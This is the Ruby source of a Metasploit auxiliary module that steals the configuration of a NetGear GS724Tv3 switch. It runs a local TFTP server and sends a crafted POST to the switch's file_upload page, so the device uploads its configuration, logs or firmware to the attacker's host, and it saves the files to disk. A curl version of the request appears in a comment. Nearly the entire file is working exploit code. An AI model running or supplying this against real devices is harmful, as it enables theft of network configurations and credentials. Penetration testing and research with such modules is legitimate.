require 'msf/core'

# FIXME needs more testing

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name'        => 'NetGear GS724Tv3 config tftp stealer',
      'Version'     => '0.1',
      'Description' => %q{This module will start a tftp server and instruct the 
                        Netgear switch to uploads its configuration},
                        'Author'      => 'Mario Manno <mario.manno@googlemail.com>',
                        'License'     =>  GPL_LICENSE
    )

    deregister_options('VHOST')
    register_options([
        OptString.new('OUTPUTDIR', [ false, "The directory where we should save the configuration files", '/tmp']),
        OptAddress.new('LHOST', [ false, "The IP address of the system running this module" ]),
        OptEnum.new('FILETYPE', [ false, "Wich object to download", 'txtcfg',
                    %w{code txtcfg errorlog messagelog traplog}])
    ], self.class)
  end

  #
  # Start the TFTP Server
  # see modules/auxiliary/scanner/snmp/cisco_config_tftp.rb 
  #
  def setup
    # Setup is called only once
    print_status("Starting TFTP server...")
    @tftp = Rex::Proto::TFTP::Server.new(69, '0.0.0.0', { 'Msf' => framework, 'MsfExploit' => self })
    @tftp.incoming_file_hook = Proc.new{|info| process_incoming(info) }
    @tftp.start
    add_socket(@tftp.sock)

    @main_thread = ::Thread.current
  end

  #
  # Kill the TFTP server
  #
  def cleanup
    # Cleanup is called once for every single thread
    if ::Thread.current == @main_thread
      # Wait 5 seconds for background transfers to complete
      print_status("Providing some time for transfers to complete...")
      ::IO.select(nil, nil, nil, 45.0)

      print_status("Shutting down the TFTP service...")
      if @tftp
        @tftp.close rescue nil
        @tftp = nil
      end
    end
  end

  #
  # Callback for incoming files
  #
  def process_incoming(info)
    return if not info[:file]
    name = info[:file][:name]
    data = info[:file][:data]
    from = info[:from]
    return if not (name and data)

    # Trim off IPv6 mapped IPv4 if necessary
    from = from[0].dup
    from.gsub!('::ffff:', '')

    print_status("Incoming file from #{from} - #{name} #{data.length} bytes")

    # Save the configuration file if a path is specified
    if datastore['OUTPUTDIR']
      name = "#{from}.txt"
      ::FileUtils.mkdir_p(datastore['OUTPUTDIR'])
      path = ::File.join(datastore['OUTPUTDIR'], name)
      ::File.open(path, "wb") do |fd|
        fd.write(data)
      end
      print_status("Saved configuration file to #{path}")
    end
  end

  def run
    print_status("Attempting to retrieve #{datastore['RPATH']}...")

    # curl -v -d "file_type=txtcfg&transfer_protocol=http&submt=16&start=1&saved_localfilename=22" 
    #   http://192.168.1.2/base/system/file_upload.html
    # file_type=txtcfg&transfer_protocol=TFTP&server_addr_type=IPv4
    #   &server_addr=192.168.1.37&filepath=&filename=config&start=on
    #   &upload_status=+&txstatus=0&saved_localfilename=22&err_flag=0
    #   &err_msg=&submt=16&cncel=&refrsh=

    res = send_request_cgi({
      'uri' => '/base/system/file_upload.html',
      'method' => 'POST',
      'vars_post' =>
      {
        'file_type' => datastore['FILETYPE'],
        'transfer_protocol' => 'TFTP',
        'server_addr_type' => 'IPv4',
        'server_addr' => datastore['LHOST'], # 0.0.0.0
        'filepath' => '',
        'filename' => 'config',
        'start' => '1',
        "txstatus" => '0',
        "saved_localfilename" => '22',
        "err_flag" => '0',
        "err_msg" => '',
        "submt" => '16',
        "cncel" => '',
        "refrsh" => '',
      }
    }, 0)

    if (res)
      print_status("The server returned: #{res.code} #{res.message}")
    else
      print_status("No response from the server")
    end
  end

end
